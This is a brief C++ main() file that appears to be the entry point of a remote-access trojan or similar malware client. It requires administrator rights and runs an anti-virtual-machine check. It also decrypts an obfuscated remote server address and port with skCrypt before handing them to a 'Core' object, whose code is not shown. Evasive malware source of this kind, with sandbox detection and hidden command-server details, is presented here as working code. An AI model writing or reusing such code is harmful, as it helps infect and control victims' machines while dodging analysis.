#include "Core.h"

int main()
{
	if (!Security::IsAdministrator())
	{
		DisplayInfo(InfoCode::RestartAsAdmin);
		return EXIT_FAILURE;
	}
	
	// Check for VMs
	Security::AntiVMs();
	
	// Server Address, Server Port
	auto addr = skCrypt("faceslog.com");
	auto port = skCrypt("21006");

	Core core(addr.decrypt(), port.decrypt()); 
	
	addr.clear();
	port.clear();

	if (core.RunCore() != 0)
	{
		system("pause");
		return EXIT_FAILURE;
	}
	
	return EXIT_SUCCESS;
}